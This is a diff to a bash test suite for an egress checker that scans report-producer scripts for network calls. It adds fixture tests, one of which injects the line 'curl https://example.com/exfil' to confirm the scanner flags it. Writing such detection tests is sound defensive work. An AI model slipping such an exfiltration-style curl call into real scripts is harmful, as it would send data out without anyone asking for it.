@@ -157,10 +157,51 @@ case "$out" in
 esac
 echo "PASS: 6b overlay drop-in scanned and caught when --overlay-report-d given"
 
-# --- 7: soft seam — missing kernel-root / overlay dir degrades cleanly ------
-if ! bash "$SCRIPT" --kernel-root "$WORK/does-not-exist" >/dev/null 2>&1; then
-  fail "7: a wholly-missing kernel-root should degrade to a clean pass (nothing to scan), not fail"
+# --- 8: kernel-side report-producers/ glob (temperloop#980) -----------------
+# Unconditional (kernel-root-relative, no flag) — a fresh fixture kernel-root
+# with NO report-producers/ dir at all must still pass clean (absent dir is a
+# silent skip, mirroring the overlay-dir soft seam).
+if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
+  fail "8a: a fixture kernel-root with no report-producers/ dir should pass clean"
 fi
-echo "PASS: 7 missing kernel-root degrades to a clean pass"
+echo "PASS: 8a missing report-producers/ dir degrades to a clean pass"
+
+mkdir -p "$FIX_KERNEL/workflows/scripts/report-producers"
+cat > "$FIX_KERNEL/workflows/scripts/report-producers/tokens" <<'EOF'
+#!/usr/bin/env bash
+# a clean fixture kernel-side producer -- local file read only
+cat /tmp/fixture-out
+EOF
+chmod +x "$FIX_KERNEL/workflows/scripts/report-producers/tokens"
+if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
+  fail "8b: a clean report-producers/ file should pass"
+fi
+echo "PASS: 8b clean report-producers/ file passes"
+
+# 8c: RED — inject a curl call into the fixture report-producers/tokens file.
+# No --overlay-report-d flag needed: this scan is unconditional.
+echo 'curl https://example.com/exfil' >> "$FIX_KERNEL/workflows/scripts/report-producers/tokens"
+if bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
+  fail "8c: an injected curl call in report-producers/tokens should FAIL the check, but it passed"
+fi
+out="$(bash "$SCRIPT" --kernel-root "$FIX_KERNEL" 2>&1 || true)"
+case "$out" in
+  *"report-producers/tokens"*"curl invocation"*) ;;
+  *) fail "8c: failure output should name the offending report-producers file; got: $out" ;;
+esac
+echo "PASS: 8c injected curl call in report-producers/tokens is caught (red demonstration)"
+
+# 8d: GREEN again — remove the fixture dir so later tests aren't affected.
+rm -rf "$FIX_KERNEL/workflows"
+if ! bash "$SCRIPT" --kernel-root "$FIX_KERNEL" >/dev/null 2>&1; then
+  fail "8d: removing report-producers/ should restore a passing check"
+fi
+echo "PASS: 8d reverted fixture (report-producers/ dir removed) passes again"
+
+# --- 9: soft seam — missing kernel-root / overlay dir degrades cleanly ------
+if ! bash "$SCRIPT" --kernel-root "$WORK/does-not-exist" >/dev/null 2>&1; then
+  fail "9: a wholly-missing kernel-root should degrade to a clean pass (nothing to scan), not fail"
+fi
+echo "PASS: 9 missing kernel-root degrades to a clean pass"
 
 echo "ALL PASS: check-producer-egress.sh"
